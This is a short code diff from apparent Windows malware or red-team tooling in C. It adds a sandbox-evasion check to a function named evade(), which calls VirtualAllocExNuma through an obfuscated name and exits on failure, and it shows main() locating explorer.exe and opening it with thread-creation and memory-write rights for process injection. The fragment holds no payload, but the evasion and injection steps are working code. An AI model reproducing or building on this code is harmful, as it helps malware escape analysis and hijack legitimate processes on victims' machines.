@@ -76,6 +76,10 @@ void evade(){
 	exNuma = GetProcAddress(GetModuleHandle("kernel32.dll"), pNuma);
 
 	LPVOID memcheck = exNuma(GetCurrentProcess(), 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
+
+	if (memcheck == NULL){
+		exit(0);
+	}
 }
 
 int FindTarget(const char *procname) {
@@ -156,7 +160,6 @@ int main(void) {
 	int pid = 0;
 	HANDLE hProc = NULL;
 	pid = FindTarget("explorer.exe");
-
 
 	if (pid){
 		hProc = poPen(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
